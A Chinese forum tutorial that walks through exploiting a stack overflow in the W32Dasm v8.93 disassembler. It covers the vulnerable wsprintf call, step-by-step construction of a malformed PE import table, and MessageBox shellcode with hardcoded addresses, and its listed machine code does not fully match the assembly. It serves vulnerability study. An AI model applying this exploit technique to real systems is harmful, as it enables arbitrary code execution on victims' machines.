
# W32dsm v8.93 漏洞分析利用

> 原文：[`www.pediy.com/kssd/pediy10/67822.html`](https://www.pediy.com/kssd/pediy10/67822.html)

【文章标题】: W32dsm v8.93 漏洞分析利用  
【文章作者】: aoanzhishu  
【作者邮箱】: aoanzhishu@yahoo.com.cn  
【下载地址】: 附件下载  
【漏洞方式】: 栈溢出  
【攻击形式】: 对话框显示  
【使用工具】: OD,LordPE,UltraEdit-32  
【操作平台】: XP (English)  
【作者声明】: 献给初学漏洞的朋友们,高手漂过,欢迎指点与建议,仅做为学习交流,别无其他目的

## 1.漏洞提要

我们首先来熟悉下 W32dsm v8.93 这个古老的漏洞，当时已经风靡网络，再拿出来练练手，对于新手很不错

英文报道：
"The program uses the `wsprintf()` function to copy the name of the imported/exported functions of the analyzed file into a buffer of only 256 bytes, with the possibility for an attacker to execute malicious code."

中文报道：
W32Dasm 在处理引出/导入函数名时存在问题，远程攻击者可以利用这个漏洞构建恶意可执行文件，诱使用户处理，可以用户进程权限在系统上执行任意指令。

程序使用 `wsprintf()`函数拷贝分析文件的引入/导出函数名到一个 256 字节的缓冲区，超长引入/导出函数名可发生缓冲区溢出，精心构建一个畸形可执行文件，诱使用户调试，可以进程权限在系统上执行任意指令。

W32dsm 处理导入函数时确实存在栈溢出漏洞，但是很长的导入函数名会造成 PE 文件无效

受影响系统：
- Microsoft Windows XP
- Microsoft Windows NT 4.0
- Microsoft Windows ME
- Microsoft Windows 98 SE
- Microsoft Windows 98
- Microsoft Windows 2000

反汇编如下:

```
0045D8DB    E8 A0170500     CALL <JMP.&USER32.wsprintfA>      格式串溢出
0045D8E0    83C4 0C         ADD ESP,0C
0045D8E3    8D8D 04FFFFFF   LEA ECX,DWORD PTR SS:[EBP-FC]
0045D8E9    51              PUSH ECX
0045D8EA    E8 65130500     CALL <JMP.&KERNEL32.lstrlen>
0045D8EF    83F8 50         CMP EAX,50
0045D8F2    7E 24           JLE SHORT H-W32Das.0045D918
0045D8F4    6A 50           PUSH 50
0045D8F6    8D85 04FFFFFF   LEA EAX,DWORD PTR SS:[EBP-FC]
0068BDC8   7C80BE2D  kernel32.7C80BE2D
0068BDCC   0068BDE4  |s = 0068BDE4
0068BDD0   004C3818  |Format = "%s"
0068BDD4   00CCD13F  \\<%s> = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"...
```

## 2.构造文件

这里要求大家熟悉 PE 文件结构的知识

找个 exe 程序把 DOS 头部复制过来如下

![](img/fc6d6d9e513bcf38677d4867bc03fc77.jpg)

找到偏移 `3C` 处发现 PE 头偏移地址为 `80h`，下面在 `80h` 处添加文件头结构体具体信息，大多数 exe 都有 `text`,`data` 节，我们找到记事本程序直接复制好相关信息

![](img/c0d97cacf82bf0185c41bf3f976c56cb.jpg)

下面要注意偏移 `100h` 处事我们要利用漏洞的关键，是导入表的 RVA 与大小，我们构造畸形文件为了简单，其他 15 项都为 0,我们构造三个区块，把第三个区块作为导入表的结构入口

首先找到 有 `0B01` 的 magic（`IMAGE_OPTIONAL_HEADER`）入口地址,再加上 `E0` 算出为 `E0h` + `98h=178h`,该偏移地址作为各个区块头的入口 继续复制记事本中的该部分，此时 `100h~177` 先填充为 0

![](img/12d15f98337badab776c9c27616c4131.jpg)

注意为了文件简小，我们把偏移 `1adh` 处偏移 RVA 改为 `20h`,即偏移 `2000`，偏移 `1d5h` 处偏移 RVA 改为 `30h`,即偏移 `3000`,自行更改区块大小值恰当即可

有 RVA 与文件偏移换算得：`.text` 在 `200h`,`.data` 在 `600h`,`.idata` 在 `800h` 处

![](img/ff23a5fc1f1eff6f7120429a571b169c.jpg)

此时 exe 文件已经成型了

下面补充代码，数据

`200h~600h` 干脆随便复制点代码就行了，但是要构造能够被 windows 识别为正常 exe 文件得下点功夫，这里不深入了

`600h~610h` 复制记事本程序的 data 段部分

![](img/137dfe793e1f4be1ac9dac409cfa1bfa.jpg)

现在到关键区段了

回到偏移 `100h`,这时我们知道该填充 `00300000h` 了，大小自定我这里选 `3C02` 大一点

接着在 `800h` 填充导入表结构信息如下

这里弄两个畸形导入函数地址分别为 `310Ch`,`3120h`

换算后为 `90Ch`,`920h`,多个便于确定溢出点

从偏移 `8d0h` 开始就填充 `78h`,越多越好最终确定溢出位置在文件偏移 `9d6h` 处

## 3.漏洞利用

![](img/137dfe793e1f4be1ac9dac409cfa1bfa.jpg)

选用该模式演示个对话框显示

![](img/2cb71661013d4962c57303ea13bf0200.jpg)

Shellcode asm 为:

```
xor ebx,ebx
push ebx
push 20207568
push 7369687A
push 6E616F61
mov eax,esp
push ebx
push eax
push ebx
mov eax,USER32.MESSAGEBOXA
call eax
nop
```

由于这个漏洞利用比较狭窄，不能超过 80 字节 shellcode,

我就不重定位选取 dll,

机器码为:

```
33DB
53
68 68752020
68 7A686973
68 616F616E
8BC4
53
50
50
53
B8 8A05457E  // 注意：这时我电脑上的 messageboxa 的地址 0x7E45058A
             // jmp esp 地址 选的通用地址 0x7FFA4512
```

复制到文件偏移 `9d6h` 处

![](img/f611d93e7ada594cc7bbb32aa94c9c1b.jpg)

下面溢出效果图

![](img/f835b7ab0f43d215b8acab39f5c036d7.jpg)

## 4.结论

其实这个漏洞利用起来比较麻烦，要求有较好的 PE 文件结构知识，而且可利用的范围狭窄，只能利用导入表溢出，空间狭窄

鄙人如有疏忽，敬请执教，欢迎指点

请勿把 exploit 作为恶意用途使用

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || exploit.rar |

|
|| |
